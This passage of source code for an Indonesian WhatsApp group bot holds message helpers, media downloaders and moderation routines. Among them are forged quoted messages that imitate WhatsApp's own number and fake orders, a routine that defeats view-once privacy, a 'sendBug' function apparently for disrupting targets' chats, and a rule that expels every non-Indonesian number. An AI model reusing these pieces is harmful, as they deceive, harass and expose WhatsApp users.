const fimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: {"imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": fake, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'), "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
                


//Set Quoted
if(Qoted === "ftoko"){
var setQuoted = ftoko
} else if(Qoted === "fkontak"){
var setQuoted = fkontak
} else if(Qoted === "ftext"){
var setQuoted = ftext
}else if(Qoted === "ftroli"){
var setQuoted = ftroli
} else if(Qoted === "fsticker"){
var setQuoted = fsticker
} else if(Qoted === "fvn"){
var setQuoted = fvn
} else if(Qoted === "floc"){
var setQuoted = floc
}else if(Qoted === "fvideo"){
var setQuoted = fvideo
} else if(Qoted === "fgc"){
var setQuoted = fgc
} else if(Qoted === "fgif"){
var setQuoted = fgif
} else if(Qoted === "fimage"){
var setQuoted = fimage
} else if(Qoted === "dev"){
var setQuoted = dev
}



//SetReply
const setReply = async(teks) =>{
if(setWeb){
xdev.sendMessage(from, teks, text, { quoted: dev, contextInfo: { forward, externalAdReply:{title: `${fake1}`,body:`${week} ${calender}`,previewType:"PHOTO",thumbnail: fs.readFileSync('./stik/reply.jpg'), sourceUrl:`http://wa.me/${nomerOwner}`}}})
} else if(setTroli){
var yakult = xdev.prepareMessageFromContent(from, {
'orderMessage': {
'orderId': '0@s.whatsapp.net',
'thumbnail': fs.readFileSync('./stik/reply.jpg'),
'itemCount': jumlahTroli,
'status': 1,
'surface': 1,
'message':teks,
'orderTitle': fake,
'sellerJid': `0@s.whatsapp.net`,
'token': 'notoken',
}
}, {
'quoted': dev,
'contextInfo': forward
});
xdev.relayWAMessage(yakult)  
} else if(setMessage){
xdev.sendMessage(from, teks, text, { quoted: dev });
} else if(setVideo){
xdev.sendMessage(from, teks, text, { quoted: dev, contextInfo: { externalAdReply: { title: `${fake}`, body: `${copyright}`, thumbnailUrl: '', thumbnail: thumb, mediaType:"2", previewType: "VIDEO", mediaUrl: "https://youtu.be/nLEYHaaB6x0"}}})
} 
}
            
//SENDKONTAK
const sendKontak = (from, nomor, nama, org = "") => {
const vcard ="BEGIN:VCARD\n" +"VERSION:3.0\n" + "FN:" +nama +"\n" +"ORG:" + org + "\n" +"TEL;type=CELL;type=VOICE;waid=" +nomor + ":+" +nomor +"\n" +"END:VCARD";
xdev.sendMessage(from, { displayname: nama, vcard: vcard }, MessageType.contact,{ quoted: dev });
};

//******************* 》BUTTON CMD《 ********************\\
   
///Button Text
const sendButMessage = (id, text1, desc1, but = []) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
}
xdev.sendMessage(id, buttonMessage, MessageType.buttonsMessage, {quoted: setQuoted})
}

///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options1 = {}) => {
kma = gam1
mhan = await xdev.prepareMessage(from, kma, image)
locmhan = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
const buttonMessages = {
imageMessage: locmhan.message.imageMessage,
contentText:  text1,
footerText: desc1,
buttons: but,
headerType: 4
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options1)
}

///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await xdev.prepareMessage(from, kma, video)
locmhan = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
 buttonMessages = {
videoMessage: locmhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}



//Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await xdev.prepareMessage(id, {jpegThumbnail: kma}, MessageType.location)
locmhan = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
buttonMessages = {
locationMessage: locmhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 'LOCATION',
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
					
					
					
					
//Button document
const Sendbutdocument = async(id, text1, desc1, gam1, but = [], options = {}) => {	

if(docType === "pptx"){
var AppType = "application/vnd.openxmlformats-officedocument.presentationml.presentation"
} else if(docType === "xlsx"){
var AppType = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
} else if(docType === "zip"){
var AppType = "application/zip"
} else if(docType === "pdf"){
var AppType = "application/pdf"
} else if(docType === "docx"){
var AppType = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
}

xdev.sendMessage(id, { 
contentText: text1, 
footerText: desc1,
buttons: but, 
"headerType": "DOCUMENT", 
"documentMessage": { 
"url": "https://mmg.whatsapp.net/d/f/Ano5cGYOFQnC51uJaqGBWiCrSJH1aDCi8-YPQMMb1N1y.enc", 
"mimetype": AppType, 
"title": "Footer text", 
"fileSha256": "8Xfe3NQDhjwVjR54tkkShLDGrIFKR9QT5EsthPyxDCI=", 
"fileLength": 999999999999, 
"pageCount": 100, 
"mediaKey": "XWv4hcnpGY51qEVSO9+e+q6LYqPR3DbtT4iqS9yKhkI=", 
"fileName": namaDocument, 
"fileEncSha256": "NI9ykWUcXKquea4BmH7GgzhMb3pAeqqwE+MTFbH/Wk8=", 
"directPath": "/v/t62.7119-24/35160407_568282564396101_3119299043264875885_n.enc?ccb=11-4&oh=d43befa9a76b69d757877c3d430a0752&oe=61915CEC", 
"mediaKeyTimestamp": "1634472176", 
"jpegThumbnail": gam1}}, 
MessageType.buttonsMessage, options)
}


///Button GIF
const sendButGif = async(id, text1, desc1, vid1, but = []) => {
kma = vid1
mhan = await xdev.prepareMessage(from, kma, video, {mimetype: Mimetype.gif, gifPlayback: true})
locmhan = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
 buttonMessages = {
videoMessage: locmhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, {mimetype: Mimetype.gif, gifPlayback: true})
}


//Katalog menu
const sendKatalog = async (deskripsi ) => {   
hmm4 = fs.readFileSync('./stik/thumb.jpeg')
imeu =   await xdev.prepareMessage('0@s.whatsapp.net', hmm4, image, { thumbnail : fs.readFileSync(`./stik/fake.jpeg`)}), 
imeg = imeu.message.imageMessage
res =   xdev.prepareMessageFromContent(from, {
'productMessage': {
'product': {
'productImage': imeg,
'productId': 'IDR',
'title': fake,
'description': deskripsi,
'retailerId': copyright,
'itemCount': jumlahTroli,
'priceAmount1000': '1000',
'descriptionCount': 1,
'productImageCount': '1'
},
'businessOwnerJid': `${nomerOwner}@s.whatsapp.net`        
}
}, {
contextInfo: forward,
quoted: setQuoted
 }), 
 xdev.relayWAMessage(res)         
}

//Troli menu
const sendTroli = async (deskripsi ) => {
var sendnih = xdev.prepareMessageFromContent(from, {
'orderMessage': {
'orderId': '0@s.whatsapp.net',
'thumbnail': fs.readFileSync(`./stik/fake.jpeg`),
'itemCount': jumlahTroli,
'status': 1,
'surface': 1,
'message':deskripsi,
'orderTitle': fake,
'sellerJid': `0@s.whatsapp.net`,
'token': 'notoken',
}
}, {
'quoted': setQuoted,
'contextInfo': forward,
});
xdev.relayWAMessage(sendnih)    
}

//SendBc
const sendBc = async(id, text1, desc1, gam1, but = [], options = {}) => {	
if(bcDokumen) {
Sendbutdocument(id, text1,desc1,gam1, but, options)
 } else  if(bcLokasi) {  
sendButLocation(id, text1,desc1,fs.readFileSync('./stik/fake.jpeg'), but, options)
} else if(bcTroli) {
sendButMessage(id, text1, desc1, but)
} else {
xdev.sendMessage(id, `${text1}\n\n${desc1}`, text)
}
}

//onlyOwner
const onlyOwner = async() =>{
if(autovn){
sendvn(gakmau)
}else if(autosticker){
sendSticker(gaboleh)
} else if(typing){
setReply(mess.owner)
}else {
setReply(mess.owner)
}
}



//******************* 》FAKE MESSAGE《 ********************\\

      
const sendvn = (teks) => {
xdev.sendMessage(from, teks, audio, {mimetype: 'audio/mp4', thumbnail: fs.readFileSync('./stik/fake.jpeg'), quoted: dev, ptt: true})
}     
const reply = (teks) => {
xdev.sendMessage(from, teks, text, { quoted: dev });
};
const sendMess = (teks) => {
xdev.sendMessage(from, teks, text)
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? xdev.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": memberr, forwardingScore: totalForward, isForwarded: forwarding } })
}
const costum = (pesan) => {
if (Loading){
xdev.sendMessage(from, pesan, text, {quoted: { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `*${fake}*`, 'jpegThumbnail': fs.readFileSync('./stik/fake.jpeg')}}}})
} 
}
const sendSticker = (pesan) => {
xdev.sendMessage(from, pesan, sticker, {quoted: dev, contextInfo: forward})
}
const sendSticker1 = (pesan) => {
xdev.sendMessage(from, pesan, sticker)
}
const math = (teks) => {
return Math.floor(teks)
}  
const sendVideo = (teks) => {
xdev.sendMessage(from, teks, video, { quoted: dev });
};       
const sendGif = (teks, teksnya) => {
xdev.sendMessage(from, teks, video, { caption: teksnya, mimetype: Mimetype.gif, quoted: dev });
};        
const sendAudio = (file) => {
xdev.sendMessage(from, file, audio, { mimetype: 'audio/mp4', quoted: dev });
};        
                    

 
 
//******************* 》FUNCTION《 ********************\\

const sendStickerFromUrl = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './stik' + names + '.png', async function () {
console.log('selesai');
let filess = './stik' + names + '.png'
let asw = './stik' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
let media = fs.readFileSync(asw)
xdev.sendMessage(to, media, sticker,{quoted:dev})
fs.unlinkSync(filess)
fs.unlinkSync(asw)
});
});
}
            
           
const sendMediaURL = async(to, url, text="", mids=[]) =>{
if(mids.length > 0){
text = normalizeMention(to, text, mids)
}
const fn = Date.now() / 10000;
const filename = fn.toString()
let mime = ""
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
mime = res.headers['content-type']
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, filename, async function () {
console.log('done');
let media = fs.readFileSync(filename)
let type = mime.split("/")[0]+"Message"
if(mime === "image/gif"){
type = MessageType.video
mime = Mimetype.gif
}
if(mime === "application/pdf"){
type = MessageType.document
mime = Mimetype.pdf
}
if(mime.split("/")[0] === "audio"){
mime = Mimetype.mp4Audio
}
xdev.sendMessage(to, media, type, { quoted: dev, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
fs.unlinkSync(filename)
});
}
            
const sendFileFromUrl = async(link, type, options) => {         
hasil = await getBuffer(link)
await xdev.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
xdev.sendMessage(from, hasil, type, options).catch(e => {
xdev.sendMessage(from, { url : link }, type, options).catch(e => {
setReply("*[ ❌ ] Error Coba Lagi...!!*")
console.log(e)
})
})
})
})
}

const sendWebp = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
}


   
const sendStickerUrl = async(to, url) => {
console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
var names = getRandom('.webp')
var namea = getRandom('.png')
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, namea, async function () {
let filess = namea
let asw = names
require('./lib/exif.js')
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
let media = fs.readFileSync(asw)
xdev.sendMessage(to, media, sticker, dev)
console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
fs.unlinkSync(names)
fs.unlinkSync(namea)
});
});
});
}
         
//CMD BUTTON FUNCTION
selectedButton = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedButtonId : ''
responseButton = (type == 'listResponseMessage') ? dev.message.listResponseMessage.title : ''
                          
            
//******************* 》SECURITY《 ********************\\
            
//ANTI VIO 
if (!dev.key.fromMe && isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {       	
setReply(`@${sender.split("@")[0]} Cie Ketahuan!`);
var msg = { ...dev };
msg.dev = dev.message.viewOnceMessage.message;
msg.dev[Object.keys(msg.dev)[0]].viewOnce = false;
xdev.copyNForward(m.chat, msg);
}
 
//ANTI HIDETAG
if (isGroup && isAntihidetag && m.message[m.mtype]?.contextInfo?.mentionedJid?.length == groupMembers.length) {    
if (isGroupAdmins) return setReply('Admin bebas pakai hidetag dong :v')
console.log( color("[ANTI-HIDETAG]", "red"), color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "cyan") );
setReply(`Maaf, Botz akan mengeluarkan kamu karena kamu terdetaksi mengirim pesan hidetag`);
setTimeout(() => {
xdev.groupRemove(from, [sender]);
},3000)
}
       
//ANTI TROLI 
if (m.message  && !m.key.fromMe && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
if (antibugtroli === false) return
if(jeda === true) return
jeda = true
m.reply('⸢ *TROLI DETECTED* ⸥\n\n' + require('util').format(m.key))
await xdev.modifyChat(m.chat, 'Goblok', {
includeStarred: false
})
setTimeout( () => {
jeda = false
},2000)
}

//ANTI BADWORD 
if (isGroup && Toxic && !isOwner && !isGroupAdmins && !dev.key.fromMe){ 
if (badword.includes(messagesC)) {
if (isCountKasar(sender, senbadword)){
if (!isBotGroupAdmins) return setReply(`Kamu beruntung karena bot bukan admin`)
setReply(`*──❒ ANTI BADWORD ❒──*\n\n*Sepertinya Kamu Sudah Berkata Kasar Lebih Dari 5x, Maaf Kamu Akan Di Kick*`)
setTimeout( () => {
xdev.groupRemove(from, [sender])
},1000)
delCountKasar(sender, senbadword)
} else {
addCountKasar(sender, senbadword)
setReply(` *──❒ TERDETEKSI ❒──*\n\n*Anda Berkata Kasar, Jangan Ulangi Lagi Tod iMystBot Otomatis Kick*`)
}
}
}
           
//ANTI VIRUS
if (isGroup && AntiVirtex && budy.length > 20000) {
if (isGroupAdmins) return setReply('*──❒ VIRTEX DETECTED ❒──*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
await xdev.modifyChat(from, ChatModification.delete)                 
await xdev.sendMessage(from, antivirus(pushname,groupName), text)
if (!isBotGroupAdmins) return 
if(isOwner) return 
await xdev.groupRemove(from, [sender])
await xdev.groupSettingChange(from, GroupSettingChange.messageSend, true)
await sendMess("*Group Telah Ditutup Karna Ada yang Kirim Virtex Goblok*")
await xdev.sendMessage(`${nomerOwner}@s.whatsapp.net`, `Hai Owner! wa.me/${sender.split("@")[0]} Terdeteksi Telah Mengirim Virtex ${isGroup?`di Group ${groupName}`:''}`, text)
 }
 
 
//Auto clear jika terdapat pesan yg tidak dapat dilihat oleh whatsapp web
if (m.messageStubType === 68) {
console.log("Auto clear chat, virtex terdeteksi")
await xdev.modifyChat(m.chat, 'clear', {
includeStarred: false
})
}

    
 //ANTI LINK GROUP
if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
if (isGroupAdmins) return
linkgc = await xdev.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain grup lain, Hampir saja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin diterima 🙂')
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
setReply(`*──❒ LINK GROUP DETECTED ❒──*\n\n\nHadeuh 😡\nNo click 🔎 ẉa.me/aryagans`)
setTimeout(() => {
xdev.groupRemove(from, [kic]).catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}   


 //ANTI ASING/BULE ok
if (isGroup && isKickarea && !dev.key.fromMe) {    
member = await groupMembers.map(u => u.jid)
for ( let i = 0; i <member.length; i++){  
if (member[i].slice(0,2) !== "62" ){     	
let users = await groupMembers.find(u => u.jid == member[i]) 
if (!users.groupAdmins ){
await xdev.groupRemove(from, [member[i]])     
}
}
}
}  




    

//******************* 》FUNCTION OTHERS《 ********************\\

    
//AFK FUNCTION
cekafk(afk)
if (!dev.key.remoteJid.endsWith('@g.us') && offline){
if (!dev.key.fromMe && isGroup ){
if (isAfk(dev.key.remoteJid)) return
addafk(dev.key.remoteJid)
heheh = ms(Date.now() - waktu) 
xdev.sendMessage(dev.key.remoteJid,`@${pushname} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${nomerOwner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
}
}   
if (dev.key.remoteJid.endsWith('@g.us') && offline) {
if (!dev.key.fromMe && isGroup){
if (dev.message.extendedTextMessage != undefined){
if (dev.message.extendedTextMessage.contextInfo != undefined){
if (dev.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
for (let ment of dev.message.extendedTextMessage.contextInfo.mentionedJid) {
if (ment === `${pushname}@s.whatsapp.net`){
if (isAfk(dev.key.remoteJid)) return
addafk(dev.key.remoteJid)
heheh = ms(Date.now() - waktu)
xdev.sendMessage(dev.key.remoteJid,`@${pushname} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan chat Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${nomerOwner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
}
}
}
}
}
}
}
   
//BOT FUNCTION
const oawalah =['Kenapa kak rindu ya ?','Ada apa kak ?','Bot aktif kak','Aing bukan bot, aing macan','Kenapa lagi kak ?','Kunaon sia ?','Oy ?','Y ?','Kenapa panggil mulu si kangen ya ?','Gabut ya kak ?','Iya kak ?']
const hayuk = oawalah[Math.floor(Math.random() * oawalah.length)]
  
//VOTING FUNCTION

 
//PUBLIC
if (publik === false) {
if (!dev.key.fromMe && !isOwner && !theOwner) return
}

//BAN CHAT
if (isBanchat){
if (!isOwner && !theOwner && !isGroupAdmins) return
}

if(isBanned && !isOwner) return
if(cekSpam("Case",senderNumber, AntiSpam)) return
SpamExpired(senderNumber, "NotCase", AntiSpam)
SpamExpired(senderNumber, "Case", AntiSpam)
expiredClaim(_claim)
       

//ANTI SPAM PRIVATE CHAT
if (isCmd && msgFilter.isFiltered(from) && !isGroup && !dev.key.fromMe && !isOwner) {
console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`), 'dari', color(pushname))
addSpam("Case",senderNumber, "30s", AntiSpam)
console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`Berhasil banned ${pushname} sementara`))
if(autovn && !nopref) {
return sendvn(nospam)
} else if(!autovn && !nopref){
return setReply(textspam)
}
}
//ANTI SPAM GROUP CHAT     
if (isCmd && msgFilter.isFiltered(from) && isGroup && !dev.key.fromMe && !isOwner) {
console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
addSpam("Case",senderNumber, "30s", AntiSpam)
console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`Berhasil banned user sementara`), 'from', color(pushname))
if(autovn && !nopref) {
return sendvn(nospam)
} else if(!autovn && !nopref){
return setReply(textspam)
}
}
if (isCmd && !isOwner) msgFilter.addFilter(from)

   
//******************* 》AUTO SYSTEM《 ********************\\


     
//AUTO REGISTER && !dev.key.fromMe && !isOwner
if (!isHit && isCmd ){ 
addUserId(gcount, limitCount, calender, pushname, senderNumber, user)
}
   
//Auto Hit 
if(command){
AddHit(senderNumber, user)
cmdAdd("run", "1d", hitnya)
}
expiredCmd(hitnya)
const thisHit = `${getHit("run", hitnya)}`











//--------------------------BATAS EXP USER------------------------\\


//Exp User
if ( isHit && !itsMe && !isCmd ||  isHit && !itsMe && command ) {

//Auto clear chat
if(AutoClearChat &&  !checkAutoClear("AutoClearChat", hitnya)){
console.log(`add autoclear chat`)
addAutoClear("AutoClearChat", "1d", hitnya) 
}

}

if(AutoClearChat){
autoClearChat( totalchat, xdev, ChatModification, hitnya)
}


//-----------------------------------------BATAS->








//AUTO TYPING & RECORDING
if (isCmd && autovn){
xdev.updatePresence(from, Presence.recording)
} else if (isCmd && typing){
xdev.updatePresence(from, Presence.composing)
} else {
xdev.updatePresence(from, Presence.avaible)
}

//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command === listcmdblock[i].cmd ){
if(autoblockcmd) {
setReply("Maaf kak command tersebut telah di block oleh system karena terjadi error")
return
} else{
setReply(`Sedang update`)
return
}
}
}

//AUTO RESPON
for (let i = 0; i < commandsDB.length ; i++) {
if (budy == commandsDB[i].pesan) {
xdev.sendMessage(from, commandsDB[i].balasan, text, {quoted: dev})
}
}
    
//AUTO RESPON SIMI BY DECODE DENPA 
if (chatBot === false && autorespon === true && !isGroup && !isCmd && !command && !dev.key.fromMe) { 
xdev.updatePresence(from, Presence.composing)
simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
sami = simi.success
setReply(`${sami}`)
} 
    
//AUTO RESPON STICKER
if (setiker.includes(messagesC)){
if(isExtream) return
namastc = messagesC
buffer = fs.readFileSync(`./temp/stick/${namastc}.webp`)
xdev.sendMessage(from, buffer, sticker, {quoted:dev })
}
	
//AUTO RESPON VN
for (let anju of audionye){
if (budy === anju){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return sendSticker(spam2)
buffer = fs.readFileSync(`./temp/audio/${anju}.mp3`)
xdev.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${pushname} \n「 audio 」 ${anju}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}, ptt: true, contextInfo: forward})
addSpam("NotCase",senderNumber, "10s", AntiSpam)
}
}
	
//AUTO RESPON MUSIK
for (let anjir of musiknye){
if (budy === anjir || responseButton === anjir ){
buffer = fs.readFileSync(`./temp/musik/${anjir}.mp3`)
xdev.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: {key: {fromMe: true,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {})},message: {orderMessage: {surface : 2,message: `🆔${pushname} 🎵${anjir}`, sellerJid: '0@s.whatsapp.net'}}},})
}
}
	

	   
//AKSES PRIVATE 
if (!isGroup && !isOwner && !isPremium && isCmd && chatBot === true) { 
if(autovn) return sendvn(gakmau)
return setReply(teksChat)
}







           

//DOWNLOAD MP4
const downloadMp4 = async (Link ) => {
/*
let info = await ytdl.getInfo(Link);
let format = ytdl.chooseFormat(info.formats, { quality: '134' });
nana = await getBuffer(format.url)
await xdev.sendMessage(from, nana, video, {quoted: dev, caption: "Nih"})        
*/

mp4File = getRandom('.mp4') 
nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on("finish", async () => {    
await xdev.sendMessage(from, fs.readFileSync(mp4File), video, {quoted: dev, caption: "*Done Kak!!*"})        
fs.unlinkSync(`./${mp4File}`)
})     

}

//DOWNLOAD MP3
const downloadMp3 = async (Link ) => {
mp3File = getRandom('.mp3') 
ytdl(Link, { filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {    
await xdev.sendMessage(from, fs.readFileSync(mp3File), audio, {quoted: dev, caption: "*Done Kak!!*"})        
fs.unlinkSync(`./${mp3File}`)
})       
} 

//SOUND CLOUD DOWNLOAD MP3
const scdlMp3 = async (Link ) => {
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(Link);
mp3File = getRandom('.mp3') 
opusFile = `${track.title}.opus`
let stream = await scdl.download(Link)
stream.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {   
	
let request = new FFMPEGRequest({
input: {
path: mp3File
},
output: {
path: opusFile,
bitrate: 128
}
});

Ffmpeg.convert(request)
.then( async filePath => {
  // Done
   await xdev.sendMessage(from, fs.readFileSync(filePath), audio, {quoted: dev})   
   fs.unlinkSync(mp3File)
   fs.unlinkSync(opusFile)
})
.catch(error => {
setReply(error)
})
})     
}






//SOUND CLOUD DOWNLOAD MP3 DOCUMENT
const scdlDoc= async (Link ) => {
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(Link);
mp3File = `./${track.title}.mp3`
let stream = await scdl.download(Link)
stream.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {    
await xdev.sendMessage(from, fs.readFileSync(mp3File), document, {mimetype: "audio/mp3" , quoted: dev, filename: `${track.title}.mp3`})   
fs.unlinkSync(mp3File)
})       
} 

//Send Buggc
const sendBug = async (target) => {
await xdev.relayWAMessage(
xdev.prepareMessageFromContent(
target,
xdev.prepareDisappearingMessageSettingContent(0),
{}
),{ waitForAck: true }) 
}


//========================================================================================================================//
colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedextendedText = type === 'extendedTextMessage' && content.includes('extendedTextMessage')
					
if (!isGroup && !isCmd ) console.log(color("[PRIVATE]", "greenyellow"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && !isCmd ) console.log(color("[GRUP]", "gold"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
if (!isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
			
_sewa.expiredCheck(xdev, sewa)
_prem.expiredCheck(premium)

	



const b1 = ["ꜱɪᴀᴩ ☕","ꜱɪᴀᴩ ☕"]
const bully1 = b1[Math.floor(Math.random() * b1.length)]
const b2 = ["ꜱɪᴀᴩ ☕","ꜱɪᴀᴩ ☕"]
